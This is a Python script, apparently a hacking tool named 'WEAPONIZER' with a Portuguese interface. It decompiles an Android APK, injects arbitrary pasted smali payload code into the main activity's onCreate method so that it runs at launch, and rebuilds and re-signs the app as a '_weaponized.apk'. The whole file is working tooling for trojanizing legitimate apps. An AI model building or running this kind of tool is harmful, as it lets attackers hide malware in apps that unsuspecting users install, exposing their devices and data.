import subprocess
import re
import os
import sys
import time
from shutil import which

# --- CONFIGURAÇÃO VISUAL ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}MODE: DIRECT MULTI-LINE INJECTION{RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def capturar_payload():
    """Captura múltiplas linhas de código do terminal."""
    print(f"\n{YELLOW}[>] Cole seu payload abaixo. Para finalizar, digite {BOLD}'DONE'{RESET}{YELLOW} em uma linha nova ou pressione Ctrl+D.{RESET}")
    print(f"{DARK_RED}--- INÍCIO DO PAYLOAD ---{RESET}")
    lines = []
    while True:
        try:
            line = input()
            if line.strip().upper() == "DONE":
                break
            lines.append(line)
        except EOFError:
            break
    print(f"{DARK_RED}--- FIM DO PAYLOAD ---{RESET}")
    return "\n".join(lines)

def injetar_payload_smali(project_folder):
    manifest = os.path.join(project_folder, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        log("Erro: AndroidManifest.xml não encontrado!", "error"); return False

    with open(manifest, "r") as f:
        content = f.read()
        match = re.search(r'<activity [^>]*android:name="([^"]+)"', content)
        if not match: log("MainActivity não detectada no manifesto!", "error"); return False
        main_activity = match.group(1)

    smali_filename = main_activity.replace('.', '/') + ".smali"
    smali_path = None
    # Busca recursiva para lidar com dex múltiplos (smali, smali_classes2, etc)
    for root, dirs, files in os.walk(project_folder):
        if smali_filename in os.path.join(root, smali_filename) and os.path.exists(os.path.join(root, smali_filename)):
            smali_path = os.path.join(root, smali_filename)
            break
    
    if not smali_path:
        log(f"Arquivo {smali_filename} não encontrado!", "error"); return False

    print(f"\n{GREEN}[+] Alvo Identificado:{RESET} {BOLD}{smali_path}{RESET}")
    
    payload_content = capturar_payload()
    if not payload_content.strip():
        log("Injeção abortada: Payload vazio.", "warn"); return False

    log("Editando código Smali para injeção do hook...", "info")
    with open(smali_path, "r") as f:
        lines = f.readlines()

    final_lines = []
    in_oncreate = False
    injected = False

    for line in lines:
        final_lines.append(line)
        if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line:
            in_oncreate = True
        
        if in_oncreate and not injected:
            # Injeta logo após o super.onCreate ou após definição de locals
            if "invoke-super" in line or ".locals" in line:
                final_lines.append(f"\n    # --- WEAPONIZER AUTO-HOOK START ---\n")
                final_lines.append(f"    {payload_content}\n")
                final_lines.append(f"    # --- WEAPONIZER AUTO-HOOK END ---\n\n")
                injected = True
        
        if ".end method" in line:
            in_oncreate = False

    if injected:
        with open(smali_path, "w") as f:
            f.writelines(final_lines)
        log("Código injetado com sucesso!", "success")
        return True
    else:
        log("Falha crítica: método 'onCreate' não encontrado na MainActivity.", "error")
        return False

def build_e_assinar(out):
    final_apk = f"{out}_weaponized.apk"
    log(f"Recompilando projeto '{out}'...", "info")
    
    res = subprocess.run(["apktool", "b", out, "-o", "tmp.apk"], capture_output=True, text=True)
    if res.returncode != 0:
        log("Erro de Recompilação! Verifique a sintaxe do seu payload.", "error")
        print(f"{RED}LOG ERR:{RESET}\n{res.stderr}"); return

    ks = "debug.keystore"
    if not os.path.exists(ks):
        log("Gerando assinatura digital...", "info")
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", ks, "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)

    log("Assinando APK e otimizando...", "info")
    subprocess.run(["apksigner", "sign", "--ks", ks, "--ks-pass", "pass:android", "--out", final_apk, "tmp.apk"])
    if os.path.exists("tmp.apk"): os.remove("tmp.apk")
    
    log(f"MISSÃO CUMPRIDA! Arquivo pronto: {BOLD}{final_apk}{RESET}", "success")
    input(f"\n{YELLOW}Pressione Enter para retornar ao menu...{RESET}")

def main():
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile (Preparar)")
        print(f" [{RED}2{RESET}] Auto-Inject & Rebuild (Payload Direto)")
        print(f" [{RED}3{RESET}] Sair")
        
        op = input(f"\n {BOLD}{RED}WEAPONIZER@terminal:~# {RESET}").strip()
        
        if op == "1":
            path = input(f" {RED}»{RESET} Caminho do APK: ").strip()
            if os.path.exists(path):
                out = os.path.splitext(os.path.basename(path))[0]
                subprocess.run(["apktool", "d", path, "-o", out, "-f"])
                log(f"Decompilado em: {out}", "success")
                input("\nPronto! Pressione Enter para voltar.")
            else: log("Arquivo não encontrado.", "error"); time.sleep(1)

        elif op == "2":
            out = input(f" {RED}»{RESET} Nome da pasta do projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                if injetar_payload_smali(out): # Aqui ele pede o payload e injeta
                    build_e_assinar(out)       # Aqui ele compila e assina
            else: log("Pasta não encontrada.", "error"); time.sleep(1)
        
        elif op == "3": break

if __name__ == "__main__":
    main()
